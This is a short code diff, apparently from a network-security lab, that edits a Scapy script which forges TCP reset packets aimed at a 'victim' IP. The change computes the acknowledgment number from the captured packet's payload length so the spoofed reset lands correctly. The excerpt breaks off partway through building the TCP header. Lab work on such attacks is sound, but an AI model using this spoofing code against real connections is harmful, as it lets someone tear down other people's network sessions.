@@ -7,13 +7,19 @@ print(f"Listen on {IFACE}")
 
 
 def send_rst(pkt):
+    pkt.show()
     if pkt[IP].src == ip_victim:
         print("capture a packet")
         ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
 
+        if Raw in pkt:
+            pay_len = len(pkt[Raw].load)
+        else:
+            pay_len = 0
+
 
         seq_num = pkt[TCP].ack
-        ack_num = pkt[TCP].seq + 1
+        ack_num = pkt[TCP].seq + pay_len
 
         tcp = TCP(
             sport=pkt[TCP].dport,
